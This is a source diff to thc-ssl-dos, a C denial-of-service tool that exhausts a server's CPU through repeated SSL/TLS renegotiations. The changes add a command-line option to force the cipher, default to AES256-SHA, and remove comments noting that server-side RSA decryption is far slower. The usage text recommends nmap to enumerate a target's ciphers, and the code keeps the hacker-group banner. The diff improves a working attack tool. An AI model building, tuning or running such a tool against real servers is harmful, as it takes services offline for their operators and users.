@@ -10,6 +10,7 @@
 #define PROGRAM_NAME		"thc-ssl-dos"
 #define TO_TCP_CONNECT		(10)	/* 10 second TCP connect() timeout */
 #define RENEGOTIATE		(0)
+#define DEFAULT_CIPHER		"AES256-SHA"
 
 
 struct _statistics
@@ -36,6 +37,7 @@ struct _opt
 	SSL_CTX *ctx;
 	struct _statistics stat;
 	int slowstart_last_peer_idx;
+	const char *cipher;
 };
 #define FL_SECURE_RENEGOTIATION		(0x01)
 #define FL_UNSECURE_RENEGOTIATION	(0x02)
@@ -62,10 +64,10 @@ struct _peer
 };
 #define FL_PEER_WANT_NEXT_STATE		(0x04)
 
-struct _peer peers[MAX_PEERS];
+static struct _peer peers[MAX_PEERS];
 #define PEER_GET_IDX(xpeer)	(int)(xpeer - &peers[0])
 
-struct _opt g_opt;
+static struct _opt g_opt;
 
 #define ERREXIT(a...)	do { \
 	fprintf(stderr, "%s:%d ", __func__, __LINE__); \
@@ -97,9 +99,8 @@ static void PEER_disconnect(struct _peer *p);
 static char *
 int_ntoa(uint32_t ip)
 {
-	struct in_addr x;
+	struct in_addr x = { 0 };
 
-	//memset(&x, 0, sizeof x);
 	x.s_addr = ip;
 	return inet_ntoa(x);
 }
@@ -126,6 +127,7 @@ init_default(void)
 	g_opt.ip = -1; //inet_addr("127.0.0.1");
 	FD_ZERO(&g_opt.rfds);
 	FD_ZERO(&g_opt.wfds);
+	g_opt.cipher = DEFAULT_CIPHER;
 }
 
 static void
@@ -141,13 +143,8 @@ init_vars(void)
 	SSL_CTX_set_options(g_opt.ctx, SSL_OP_LEGACY_SERVER_CONNECT);
 	SSL_CTX_set_options(g_opt.ctx, SSL_OP_ALL);
 #endif
-	/* AES256-SHA              SSLv3 Kx=RSA      Au=RSA  Enc=AES(256) */
-	/* RC4-MD5                 SSLv3 Kx=RSA      Au=RSA  Enc=RC4(128) */
-	/* RSA_decrypt() is 15x slower (used for Kx) than RSA_encrypt() */
-	//SSL_CTX_set_cipher_list(g_opt.ctx, "ECDHE-RSA-AES256-SHA");
-	SSL_CTX_set_cipher_list(g_opt.ctx, "AES256-SHA");
-	//SSL_CTX_set_cipher_list(g_opt.ctx, "RC4-MD5");
-	//SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1);
+	SSL_CTX_set_cipher_list(g_opt.ctx, g_opt.cipher);
+
 
 	int i;
 	for (i = 0; i < MAX_PEERS; i++)
@@ -159,9 +156,12 @@ usage(void)
 {
 	fprintf(stderr,
 		"./" PROGRAM_NAME " [options] <ip> <port>\n"
-		"  -h      help\n"
-		"  -l <n>  Limit parallel connections [default: %d]\n",
-		DEFAULT_PEERS);
+		"  -h           Print this help and exit.\n"
+		"  -l <n>       Limit parallel connections [default: %d].\n"
+		"  -c <cipher>  Force cipher choice [default: %s].\n"
+		"               To list available ciphers run command:\n"
+		"               nmap --script ssl-enum-ciphers -p <PORT> <IP>\n",
+		DEFAULT_PEERS, DEFAULT_CIPHER);
 	exit(0);
 }
 
@@ -182,11 +182,14 @@ do_getopt(int argc, char *argv[])
 	int option_index = 0;
 
 
-	while ((c = getopt_long(argc, argv, "hl:", long_options, &option_index)) != -1)
+	while ((c = getopt_long(argc, argv, "hl:c:", long_options, &option_index)) != -1)
 	{
 		switch (c)
 		{
 		case 0:
+			break;
+		case 'c':
+			g_opt.cipher = optarg;
 			break;
 		case 'l':
 			g_opt.n_max_peers = atoi(optarg);
@@ -675,23 +678,24 @@ main(int argc, char *argv[])
 	fd_set rfds;
 	fd_set wfds;
 
-printf("     ______________ ___  _________\n"
-       "     \\__    ___/   |   \\ \\_   ___ \\\n"
-       "       |    | /    ~    \\/    \\  \\/\n"
-       "       |    | \\    Y    /\\     \\____\n"
-       "       |____|  \\___|_  /  \\______  /\n"
-       "                     \\/          \\/\n"
-       "            http://www.thc.org\n"
-       "\n"
-       "          Twitter @hackerschoice\n"
-       "\n"
-       "Greetingz: the french underground\n"
-       "\n");
+	printf("     ______________ ___  _________\n"
+	       "     \\__    ___/   |   \\ \\_   ___ \\\n"
+	       "       |    | /    ~    \\/    \\  \\/\n"
+	       "       |    | \\    Y    /\\     \\____\n"
+	       "       |____|  \\___|_  /  \\______  /\n"
+	       "                     \\/          \\/\n"
+	       "            http://www.thc.org\n"
+	       "\n"
+	       "          Twitter @hackerschoice\n"
+	       "\n"
+	       "Greetingz: the french underground\n"
+	       "\n");
 	fflush(stdout);
 
 	init_default();
 	do_getopt(argc, argv);
 	init_vars();
+	DEBUGF("Use cipher '%s'\n", g_opt.cipher);
 
 	g_opt.n_peers = 1;
 	for (i = 0; i < g_opt.n_peers; i++)
@@ -749,7 +753,6 @@ printf("     ______________ ___  _________\n"
 
 	}
 
-	exit(0);
 	return 0;
 }
 
